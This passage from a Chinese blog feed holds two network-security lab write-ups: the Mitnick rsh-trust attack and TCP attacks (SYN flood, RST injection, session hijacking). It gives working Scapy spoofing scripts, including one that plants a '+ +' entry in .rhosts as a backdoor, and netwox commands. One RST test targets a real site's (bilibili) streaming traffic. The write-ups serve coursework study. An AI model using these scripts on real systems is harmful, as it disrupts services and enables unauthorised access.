'A': ACK bit</span><span class="hljs-comment"># 'P': PSH bit</span><span class="hljs-comment"># 'R': RST bit</span><span class="hljs-comment"># 'S': SYN bit</span><span class="hljs-comment"># 'F': FIN bit</span>ip = IP(src=<span class="hljs-string">"10.0.2.7"</span>, dst=<span class="hljs-string">"10.0.2.5"</span>)tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>, flags=<span class="hljs-number">2</span>, seq=<span class="hljs-number">666666</span>)pkt = ip/tcpls(pkt)send(pkt,verbose=<span class="hljs-number">0</span>)</code></pre><p>  wireshark截图如下：</p><p>  <img src="/2020/11/05/Mitnick-Attack/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p>  可以看到<strong>X-Terminal（10.0.2.5）</strong>向<strong>Trusted（10.0.2.7）</strong>发送了与SYN对应的<strong>SYN ACK报文</strong>，但是由于此时的Trusted主机静音/关闭，无法返回一个ACK报文，所以之后X-terminal会向Trusted主机发送retransmission（重新发送）报文</p></li></ul><h4 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h4><ul><li><p>实现原理：<img src="/2020/11/05/Mitnick-Attack/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p></li><li><p>具体实现：</p><p>  sniff_spoof.py文件如下：</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *x_ip = <span class="hljs-string">"10.0.2.5"</span> <span class="hljs-comment"># X-Terminal</span>x_port = <span class="hljs-number">514</span> <span class="hljs-comment"># Port number used by X-Terminal</span>srv_ip = <span class="hljs-string">"10.0.2.7"</span> <span class="hljs-comment"># The trusted server</span>srv_port = <span class="hljs-number">1023</span> <span class="hljs-comment"># Port number used by the trusted server</span><span class="hljs-comment"># Add 1 to the sequence number used in the spoofed SYN</span>seq_num = <span class="hljs-number">0x1000</span> + <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof</span><span class="hljs-params">(pkt)</span>:</span><span class="hljs-keyword">global</span> seq_num <span class="hljs-comment"># We will update this global variable in the function</span>old_ip = pkt[IP]old_tcp = pkt[TCP]<span class="hljs-comment"># Print out debugging information</span>tcp_len = old_ip.len - old_ip.ihl*<span class="hljs-number">4</span> - old_tcp.dataofs*<span class="hljs-number">4</span> <span class="hljs-comment"># TCP data length</span>print(<span class="hljs-string">"&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;"</span>.format(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))<span class="hljs-comment"># Construct the IP header of the response</span>ip = IP(src=srv_ip, dst=x_ip)<span class="hljs-comment"># Check whether it is a SYN+ACK packet or not;</span><span class="hljs-comment"># if it is, spoof an ACK packet</span><span class="hljs-comment"># ... Add code here ...</span><span class="hljs-keyword">if</span> old_tcp.flags == <span class="hljs-number">18</span>:<span class="hljs-comment">#when it is SYN + ACK packet</span><span class="hljs-comment">#we need to spoof a ACK packet</span>tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>, flags=<span class="hljs-number">16</span>, seq=<span class="hljs-number">666667</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)pkt2 = ip/tcpls(pkt2)send(pkt2,verbose=<span class="hljs-number">0</span>)myFilter = <span class="hljs-string">'tcp port 514'</span> <span class="hljs-comment"># You need to make the filter more specific</span>pkt = sniff(filter=myFilter, prn=spoof)</code></pre><p>  之后先运行之前的spoof_SYN文件，再运行当前文件，wireshark截图如下</p><p>  <img src="/2020/11/05/Mitnick-Attack/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>  可以看到，<strong>X-Terminal（10.0.2.5）</strong>对于伪造的来自<strong>Trusted（10.0.2.7）</strong>的SYN请求返回了一个SYN+ACK包，并且由于运行在<strong>Attack（10.0.2.4）</strong>上面的sniff_spoof嗅探程序，成功的伪造了一个ACK包并发送给了<strong>X-Terminal</strong></p></li></ul><h4 id="步骤3：欺骗rsh数据包"><a href="#步骤3：欺骗rsh数据包" class="headerlink" title="步骤3：欺骗rsh数据包"></a>步骤3：欺骗rsh数据包</h4><ul><li><p>首先，是在原先步骤2的基础上实现，需要先发送完ack之后再发送这个数据包</p><p>  <img src="/2020/11/05/Mitnick-Attack/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p></li><li><p>具体的code</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *x_ip = <span class="hljs-string">"10.0.2.5"</span> <span class="hljs-comment"># X-Terminal</span>x_port = <span class="hljs-number">514</span> <span class="hljs-comment"># Port number used by X-Terminal</span>srv_ip = <span class="hljs-string">"10.0.2.7"</span> <span class="hljs-comment"># The trusted server</span>srv_port = <span class="hljs-number">1023</span> <span class="hljs-comment"># Port number used by the trusted server</span><span class="hljs-comment"># Add 1 to the sequence number used in the spoofed SYN</span>seq_num = <span class="hljs-number">0x1000</span> + <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof</span><span class="hljs-params">(pkt)</span>:</span><span class="hljs-keyword">global</span> seq_num <span class="hljs-comment"># We will update this global variable in the function</span>old_ip = pkt[IP]old_tcp = pkt[TCP]<span class="hljs-comment"># Print out debugging information</span>tcp_len = old_ip.len - old_ip.ihl*<span class="hljs-number">4</span> - old_tcp.dataofs*<span class="hljs-number">4</span> <span class="hljs-comment"># TCP data length</span>print(<span class="hljs-string">"&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;"</span>.format(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))<span class="hljs-comment"># Construct the IP header of the response</span>ip = IP(src=srv_ip, dst=x_ip)<span class="hljs-comment"># Check whether it is a SYN+ACK packet or not;</span><span class="hljs-comment"># if it is, spoof an ACK packet</span><span class="hljs-comment"># ... Add code here ...</span><span class="hljs-keyword">if</span> old_tcp.flags == <span class="hljs-number">18</span>:<span class="hljs-comment">#when it is SYN + ACK packet</span><span class="hljs-comment">#we need to spoof a ACK packet</span>tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>, flags=<span class="hljs-number">16</span>, seq=<span class="hljs-number">666667</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)pkt2 = ip/tcpls(pkt2)send(pkt2,verbose=<span class="hljs-number">0</span>)<span class="hljs-comment">#we need to send the rsh data packet</span>tcp2 = TCP(sport = <span class="hljs-number">1023</span> , dport = <span class="hljs-number">514</span> , flags = <span class="hljs-number">24</span> , seq = <span class="hljs-number">666667</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)data = <span class="hljs-string">'9090\x00seed\x00seed\x00touch /tmp/xyz\x00'</span>print(<span class="hljs-string">"#######the rsh session#######"</span>)pkt3 = ip/tcp2/datals(pkt3)send(pkt3, verbose=<span class="hljs-number">0</span>)myFilter = <span class="hljs-string">'tcp and src host 10.0.2.5 and src port 514'</span> <span class="hljs-comment"># You need to make the filter more specific</span>pkt = sniff(filter=myFilter, prn=spoof)</code></pre></li><li><p>之后进行运行，首先是wireshark抓包情况，可以看到再wireshark中抓到了三次握手建立第一次连接的SYN，SYN+ACK，ACK包，还有之后发送的data数据包以及服务器返回的ACK包</p><p>  <img src="/2020/11/05/Mitnick-Attack/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p></li><li><p>然后来检查是否执行相关的命令，会发现由于返回错误的连接并没有建立（没有发送相应的SYN+ACK包），导致命令并没有执行</p><p>  <img src="/2020/11/05/Mitnick-Attack/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p></li></ul><h3 id="Task-2-2：欺骗第二个TCP连接"><a href="#Task-2-2：欺骗第二个TCP连接" class="headerlink" title="Task 2.2：欺骗第二个TCP连接"></a>Task 2.2：欺骗第二个TCP连接</h3><ul><li><p>具体实现原理</p><p>  <img src="/2020/11/05/Mitnick-Attack/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p></li><li><p>具体的code（在之前的sniff_spoof.py的基础上实现的）</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *x_ip = <span class="hljs-string">"10.0.2.5"</span> <span class="hljs-comment"># X-Terminal</span>x_port = <span class="hljs-number">514</span> <span class="hljs-comment"># Port number used by X-Terminal</span>srv_ip = <span class="hljs-string">"10.0.2.7"</span> <span class="hljs-comment"># The trusted server</span>srv_port = <span class="hljs-number">1023</span> <span class="hljs-comment"># Port number used by the trusted server</span><span class="hljs-comment"># Add 1 to the sequence number used in the spoofed SYN</span>seq_num = <span class="hljs-number">0x1000</span> + <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof</span><span class="hljs-params">(pkt)</span>:</span><span class="hljs-keyword">global</span> seq_num <span class="hljs-comment"># We will update this global variable in the function</span>old_ip = pkt[IP]old_tcp = pkt[TCP]<span class="hljs-comment"># Print out debugging information</span>tcp_len = old_ip.len - old_ip.ihl*<span class="hljs-number">4</span> - old_tcp.dataofs*<span class="hljs-number">4</span> <span class="hljs-comment"># TCP data length</span>print(<span class="hljs-string">"&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;"</span>.format(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))<span class="hljs-comment"># Construct the IP header of the response</span>ip = IP(src=srv_ip, dst=x_ip)<span class="hljs-comment"># Check whether it is a SYN+ACK packet or not;</span><span class="hljs-comment"># if it is, spoof an ACK packet</span><span class="hljs-comment"># ... Add code here ...</span><span class="hljs-keyword">if</span> old_tcp.flags == <span class="hljs-number">18</span>:<span class="hljs-comment">#when it is SYN + ACK packet</span><span class="hljs-comment">#we need to spoof a ACK packet</span>tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>, flags=<span class="hljs-number">16</span>, seq=<span class="hljs-number">666667</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)pkt2 = ip/tcpls(pkt2)send(pkt2,verbose=<span class="hljs-number">0</span>)<span class="hljs-comment">#we need to send the rsh data packet</span>tcp2 = TCP(sport = <span class="hljs-number">1023</span> , dport = <span class="hljs-number">514</span> , flags = <span class="hljs-number">24</span> , seq = <span class="hljs-number">666667</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)data = <span class="hljs-string">'9090\x00seed\x00seed\x00touch /tmp/xyz\x00'</span>print(<span class="hljs-string">"###################### the rsh session ###########################"</span>)pkt3 = ip/tcp2/datals(pkt3)send(pkt3, verbose=<span class="hljs-number">0</span>)<span class="hljs-keyword">if</span> old_tcp.flags == <span class="hljs-number">2</span>:tcp = TCP(sport = <span class="hljs-number">9090</span>, dport = <span class="hljs-number">1023</span>, flags = <span class="hljs-number">18</span>, seq = <span class="hljs-number">112233</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)pkt2 = ip/tcpprint(<span class="hljs-string">"###################### the second connection #####################"</span>)ls(pkt2)send(pkt2, verbose=<span class="hljs-number">0</span>)myFilter = <span class="hljs-string">'tcp and src host 10.0.2.5'</span> <span class="hljs-comment"># You need to make the filter more specific</span>pkt = sniff(filter=myFilter, prn=spoof)</code></pre></li><li><p>wireshark抓包情况，能够看到第二个TCP连接已经建立好，并且已经创建文件，时间戳一致</p><p>  <img src="/2020/11/05/Mitnick-Attack/2-8.png" srcset="/img/loading.gif" alt="2-8"></p><p>  <img src="/2020/11/05/Mitnick-Attack/2-9.PNG" srcset="/img/loading.gif" alt="2-9"></p></li></ul><h2 id="Task-3：设置后门"><a href="#Task-3：设置后门" class="headerlink" title="Task 3：设置后门"></a>Task 3：设置后门</h2><ul><li><p>基本原理已经在上面说过</p></li><li><p>具体的code，在<strong>上面的code的基础上改命令即可</strong></p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *x_ip = <span class="hljs-string">"10.0.2.5"</span> <span class="hljs-comment"># X-Terminal</span>x_port = <span class="hljs-number">514</span> <span class="hljs-comment"># Port number used by X-Terminal</span>srv_ip = <span class="hljs-string">"10.0.2.7"</span> <span class="hljs-comment"># The trusted server</span>srv_port = <span class="hljs-number">1023</span> <span class="hljs-comment"># Port number used by the trusted server</span><span class="hljs-comment"># Add 1 to the sequence number used in the spoofed SYN</span>seq_num = <span class="hljs-number">0x1000</span> + <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof</span><span class="hljs-params">(pkt)</span>:</span><span class="hljs-keyword">global</span> seq_num <span class="hljs-comment"># We will update this global variable in the function</span>old_ip = pkt[IP]old_tcp = pkt[TCP]<span class="hljs-comment"># Print out debugging information</span>tcp_len = old_ip.len - old_ip.ihl*<span class="hljs-number">4</span> - old_tcp.dataofs*<span class="hljs-number">4</span> <span class="hljs-comment"># TCP data length</span>print(<span class="hljs-string">"&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;"</span>.format(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))<span class="hljs-comment"># Construct the IP header of the response</span>ip = IP(src=srv_ip, dst=x_ip)<span class="hljs-comment"># Check whether it is a SYN+ACK packet or not;</span><span class="hljs-comment"># if it is, spoof an ACK packet</span><span class="hljs-comment"># ... Add code here ...</span><span class="hljs-keyword">if</span> old_tcp.flags == <span class="hljs-number">18</span>:<span class="hljs-comment">#when it is SYN + ACK packet</span><span class="hljs-comment">#we need to spoof a ACK packet</span>tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>, flags=<span class="hljs-number">16</span>, seq=<span class="hljs-number">666667</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)pkt2 = ip/tcpls(pkt2)send(pkt2,verbose=<span class="hljs-number">0</span>)<span class="hljs-comment">#we need to send the rsh data packet</span>tcp2 = TCP(sport = <span class="hljs-number">1023</span> , dport = <span class="hljs-number">514</span> , flags = <span class="hljs-number">24</span> , seq = <span class="hljs-number">666667</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)data = <span class="hljs-string">'9090\x00seed\x00seed\x00echo + + &gt; .rhosts\x00'</span>print(<span class="hljs-string">"###################### the rsh session ###########################"</span>)pkt3 = ip/tcp2/datals(pkt3)send(pkt3, verbose=<span class="hljs-number">0</span>)<span class="hljs-keyword">if</span> old_tcp.flags == <span class="hljs-number">2</span>:tcp = TCP(sport = <span class="hljs-number">9090</span>, dport = <span class="hljs-number">1023</span>, flags = <span class="hljs-number">18</span>, seq = <span class="hljs-number">112233</span> , ack = old_tcp.seq + <span class="hljs-number">1</span>)pkt2 = ip/tcpprint(<span class="hljs-string">"###################### the second connection #####################"</span>)ls(pkt2)send(pkt2, verbose=<span class="hljs-number">0</span>)myFilter = <span class="hljs-string">'tcp and src host 10.0.2.5'</span> <span class="hljs-comment"># You need to make the filter more specific</span>pkt = sniff(filter=myFilter, prn=spoof)</code></pre><p>  wireshark抓包情况如下</p><p>  <img src="/2020/11/05/Mitnick-Attack/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>  之后查看<strong>X-Terminal</strong>上面的.rhosts文件，可以看到已经添加了++进去</p><p>  <img src="/2020/11/05/Mitnick-Attack/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p></li></ul><pre><code>![3-3](Mitnick-Attack/3-3.PNG)可以看到，成功登录</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCP_Attack</title>
    <link href="/2020/11/03/TCP-Attack/"/>
    <url>/2020/11/03/TCP-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP-Attack-Lab"><a href="#TCP-IP-Attack-Lab" class="headerlink" title="TCP/IP Attack Lab"></a>TCP/IP Attack Lab</h1><p>首先是三台在同一子网中的主机信息（<strong>Attacker 攻击者 – Victim 受害者 – Observe 旁观者</strong>）</p><p><img src="/2020/11/03/TCP-Attack/0-1.PNG" srcset="/img/loading.gif" alt="0-1">)<img src="/2020/11/03/TCP-Attack/0-2.PNG" srcset="/img/loading.gif" alt="0-2">)<img src="/2020/11/03/TCP-Attack/0-3.PNG" srcset="/img/loading.gif" alt="0-3"></p><h2 id="Task-1：SYN洪泛攻击"><a href="#Task-1：SYN洪泛攻击" class="headerlink" title="Task 1：SYN洪泛攻击"></a>Task 1：SYN洪泛攻击</h2><h3 id="实现原理-漏洞所在"><a href="#实现原理-漏洞所在" class="headerlink" title="实现原理/漏洞所在"></a>实现原理/漏洞所在</h3><p><img src="/2020/11/03/TCP-Attack/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>即Attacker可以通过伪造数据包来进行SYN攻击，使得存储相应的半开的链接的队列被覆盖满，之后新来的SYN 请求就无法建立连接</p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><h4 id="关闭SYN-cookie防御机制"><a href="#关闭SYN-cookie防御机制" class="headerlink" title="关闭SYN cookie防御机制"></a>关闭SYN cookie防御机制</h4><p>首先将SYN cookie机制关闭并且查看对应的队列的空间大小</p><p><img src="/2020/11/03/TCP-Attack/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p>此时在另一台（<strong>observe</strong>）上面登录受害者主机（telnet来建立TCP连接），此时<strong>登陆成功</strong></p><p><img src="/2020/11/03/TCP-Attack/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><p>之后用攻击者主机对受害者主机进行攻击，执行下面命令</p><pre><code class="hljs stylus">netwox <span class="hljs-number">76</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-string">"10.0.2.5"</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">"23"</span></code></pre><p>之后查看队列情况以及wireshark嗅探情况</p><ul><li><p>队列情况：会发现多了很多state 为 SYN_RECV的”半开”连接</p><p>  <img src="/2020/11/03/TCP-Attack/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p></li><li><p>wireshark对应的抓包情况：可以看到多了很多TCP的包，并且是SYN（flag = 0x2）的包<img src="/2020/11/03/TCP-Attack/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p></li></ul><p>之后在<strong>observe</strong>上面尝试telnet <strong>victim</strong>，会发现一直在trying，并且之后提示timeout，可知SYN 洪泛攻击成功</p><p><img src="/2020/11/03/TCP-Attack/1-6.PNG" srcset="/img/loading.gif" alt="1-6"></p><h4 id="打开SYN-cookie防御机制"><a href="#打开SYN-cookie防御机制" class="headerlink" title="打开SYN cookie防御机制"></a>打开SYN cookie防御机制</h4><p>SYN cookie的防御原理</p><blockquote><p>在TCP服务器收到TCP SYN包并返回TCP SYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值.</p><p>在收到TCP ACK包时，TCP服务器在根据那个cookie值检查这个TCP ACK包的合法性.如果合法，再分配专门的数据区进行处理未来的TCP连接.</p></blockquote><p><img src="/2020/11/03/TCP-Attack/1-7.PNG" srcset="/img/loading.gif" alt="1-7"></p><p>查看此时的队列情况</p><p><img src="/2020/11/03/TCP-Attack/1-8.PNG" srcset="/img/loading.gif" alt="1-8"></p><p>此时在observe上面登录victim是能够登陆的</p><p><img src="/2020/11/03/TCP-Attack/1-9.PNG" srcset="/img/loading.gif" alt="1-9"></p><p>之后再attack上面攻击victim</p><pre><code class="hljs stylus">netwox <span class="hljs-number">76</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-string">"10.0.2.5"</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">"23"</span></code></pre><p>之后，在observe上面登录，发现仍然能够登录，SYN洪泛攻击失败</p><p><img src="/2020/11/03/TCP-Attack/1-10.PNG" srcset="/img/loading.gif" alt="1-10"></p><h2 id="Task-2：TCP-RST攻击"><a href="#Task-2：TCP-RST攻击" class="headerlink" title="Task 2：TCP RST攻击"></a>Task 2：TCP RST攻击</h2><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><blockquote><ul><li><strong>复位 RST (Reset)</strong>：当值为 1 时，表明 TCP 连接出现严重差错，必须立即释放，然后再重新建立连接；也可以用来拒绝一个非法的报文段或拒绝打开一个连接。</li></ul></blockquote><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><h4 id="telnet连接断开（netwox实现）"><a href="#telnet连接断开（netwox实现）" class="headerlink" title="telnet连接断开（netwox实现）"></a>telnet连接断开（netwox实现）</h4><ul><li><p>首先先建立victim与observe之间的telnet连接</p><p>  <img src="/2020/11/03/TCP-Attack/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>  之后再victim上面查看对应端口号23</p><p>  <img src="/2020/11/03/TCP-Attack/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p></li><li><p>之后在<strong>attack</strong>运行</p>  <pre><code class="hljs angelscript">netwox <span class="hljs-number">78</span> -d enp0s3</code></pre><p>  之后在observe上面随意输入一个字符，会发现连接断开</p><p>  <img src="/2020/11/03/TCP-Attack/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><p>  查看对应的wireshark抓包情况，可以看到抓到RST包（Flag = 0x14）</p><p>  <img src="/2020/11/03/TCP-Attack/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>  最后来查看对应的连接的队列，会发现原来的连接已经没有了</p><p>  <img src="/2020/11/03/TCP-Attack/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p></li></ul><h4 id="ssh连接断开（netwox实现）"><a href="#ssh连接断开（netwox实现）" class="headerlink" title="ssh连接断开（netwox实现）"></a>ssh连接断开（netwox实现）</h4><ul><li><p>首先先用ssh连接victim</p><p>  <img src="/2020/11/03/TCP-Attack/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p>  查看对应的22号端口，发现对应的TCP连接已经建立</p><p>  <img src="/2020/11/03/TCP-Attack/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p></li><li><p>之后在attack上面发动攻击</p><p>  运行相应命令，在observe上面输入字符并且查看wireshark抓包情况</p><p>  <img src="/2020/11/03/TCP-Attack/2-8.PNG" srcset="/img/loading.gif" alt="2-8"></p><p>  会发现提示broken pipe，并且之后输入ifconfig查看，会发现已经恢复到<strong>observe</strong>原本的状态</p><p>  <img src="/2020/11/03/TCP-Attack/2-10.PNG" srcset="/img/loading.gif" alt="2-10"></p><p>  之后查看相关的端口也发现连接已经被移除</p></li></ul><h4 id="telnet连接断开（Scapy实现）"><a href="#telnet连接断开（Scapy实现）" class="headerlink" title="telnet连接断开（Scapy实现）"></a>telnet连接断开（Scapy实现）</h4><ul><li><p>首先进行telnet登录，和之前一样即可，在这里需要得到相应的端口的信息</p>  <pre><code class="hljs angelscript">tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.5</span>:<span class="hljs-number">23</span>             <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.7</span>:<span class="hljs-number">53184</span>          ESTABLISHED</code></pre></li><li><p>attack攻击，具体代码如下</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *ip = IP(src=<span class="hljs-string">"10.0.2.7"</span>, dst=<span class="hljs-string">"10.0.2.5"</span>)tcp = TCP(sport=<span class="hljs-number">53184</span>, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-number">20</span>, seq=<span class="hljs-number">1590699372</span>, ack=<span class="hljs-number">3220603117</span>)pkt = ip/tcpls(pkt)send(pkt,verbose=<span class="hljs-number">0</span>)</code></pre><p>  其中的seq和ack是来自于之前包的观察，seq是包的发送方要发送的字节流的顺序，而ack则是当发送这个包的主机作为接收方时所期望的下一个字节的字节流顺序</p><blockquote><p><strong>确认号</strong>：占 4 字节，表示期望收到对方下一个报文段的第一个数据字节的序号。例如 B 收到 A 的报文，序号值为 501 ，数据长度为 200 字节（序号 501 ~ 700），此时表明 B 正确收到了序号 700 及其之前的所有数据，因此 B 在发送给 A 的确认报文段中确认号的值为 701。</p></blockquote><p>  <img src="/2020/11/03/TCP-Attack/2-11.PNG" srcset="/img/loading.gif" alt="2-11"></p><p>  wireshark抓包情况</p><p>  <img src="/2020/11/03/TCP-Attack/2-12.PNG" srcset="/img/loading.gif" alt="2-12"></p><p>  之后在observe上面输入字符会发现连接被拆除，并且输入ifconfig来确认会发现是<strong>observe本来的IP地址</strong></p><p>  <img src="/2020/11/03/TCP-Attack/2-13.PNG" srcset="/img/loading.gif" alt="2-13"></p></li></ul><h4 id="ssh连接拆除（Scapy实现）"><a href="#ssh连接拆除（Scapy实现）" class="headerlink" title="ssh连接拆除（Scapy实现）"></a>ssh连接拆除（Scapy实现）</h4><ul><li><p>同理，先进行ssh连接，和之前一样</p></li><li><p>attack攻击</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *ip = IP(src=<span class="hljs-string">"10.0.2.7"</span>, dst=<span class="hljs-string">"10.0.2.5"</span>)tcp = TCP(sport=<span class="hljs-number">39772</span>, dport=<span class="hljs-number">22</span>, flags=<span class="hljs-number">20</span>, seq=<span class="hljs-number">2366978434</span>, ack=<span class="hljs-number">2391627645</span>)pkt = ip/tcpls(pkt)send(pkt,verbose=<span class="hljs-number">0</span>)</code></pre><p>  其中seq和ack的数还是来自与之前的包</p><p>  <img src="/2020/11/03/TCP-Attack/2-14.PNG" srcset="/img/loading.gif" alt="2-14"></p><p>  然后在observe上面输入会发现<strong>Broken pipe</strong>并且之后ifconfig查看，连接确实断开</p><p>  <img src="/2020/11/03/TCP-Attack/2-15.PNG" srcset="/img/loading.gif" alt="2-15"></p></li></ul><h2 id="Task-3：在流媒体APP上进行TCP-RST攻击"><a href="#Task-3：在流媒体APP上进行TCP-RST攻击" class="headerlink" title="Task 3：在流媒体APP上进行TCP RST攻击"></a>Task 3：在流媒体APP上进行TCP RST攻击</h2><h3 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h3><p>原理就是RST攻击，只不过是更加实际化，TCP连接的server没有出现在子网中</p><h3 id="具体实现："><a href="#具体实现：" class="headerlink" title="具体实现："></a>具体实现：</h3><p>选择bilibili作为victim所要访问的网站，并且建立相应的TCP连接</p><p><img src="/2020/11/03/TCP-Attack/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>之后在attack上面执行netwox命令</p><p><img src="/2020/11/03/TCP-Attack/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><p>之后发现视频再播放一会之后会一直卡住</p><p><img src="/2020/11/03/TCP-Attack/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>猜测是由于TCP连接断开，会进行重连的尝试，但是一直会是RST，查看wireshark抓包情况</p><p><img src="/2020/11/03/TCP-Attack/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><h2 id="Task-4：TCP会话劫持"><a href="#Task-4：TCP会话劫持" class="headerlink" title="Task 4：TCP会话劫持"></a>Task 4：TCP会话劫持</h2><h3 id="实现原理-2"><a href="#实现原理-2" class="headerlink" title="实现原理"></a>实现原理</h3><p>通过向TCP连接中注入恶意内容来实现目的（比如删除某一个重要文件）</p><p><img src="/2020/11/03/TCP-Attack/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><h3 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h3><h4 id="netwox实现"><a href="#netwox实现" class="headerlink" title="netwox实现"></a>netwox实现</h4><ul><li><p>首先先再<strong>observe</strong>上面telnet <strong>victim</strong>，并且在attack上面运行wireshark来抓包</p><p>  <img src="/2020/11/03/TCP-Attack/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p></li><li><p>此时，在attack上面输入netwox指令</p>  <pre><code class="hljs lsl">netwox <span class="hljs-number">40</span> --ip4-offsetfrag <span class="hljs-number">0</span> --ip4-ttl <span class="hljs-number">64</span> --ip4-protocol <span class="hljs-number">6</span> --ip4-src <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.7</span> --ip4-dst <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.5</span> --tcp-src <span class="hljs-number">53228</span> --tcp-dst <span class="hljs-number">23</span> --tcp-seqnum <span class="hljs-number">3349246675</span> --tcp-acknum <span class="hljs-number">488164510</span> --tcp-psh --tcp-ack --tcp-window <span class="hljs-number">128</span> --tcp-data <span class="hljs-string">"6c730d00"</span></code></pre><p>  运行，相关截图如下</p><p>  <img src="/2020/11/03/TCP-Attack/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p><p>  之后在<strong>attack</strong>上面查看wireshark，发现能够显示相应的server端的回应的包</p><p>  <img src="/2020/11/03/TCP-Attack/4-4.PNG" srcset="/img/loading.gif" alt="4-4"></p><p>  包里面的data就是原本应该在<strong>victim</strong>上面显示的内容</p></li></ul><h4 id="Scapy实现"><a href="#Scapy实现" class="headerlink" title="Scapy实现"></a>Scapy实现</h4><p>同样，也是首先进行telnet连接，之后运行py文件，code如下</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> 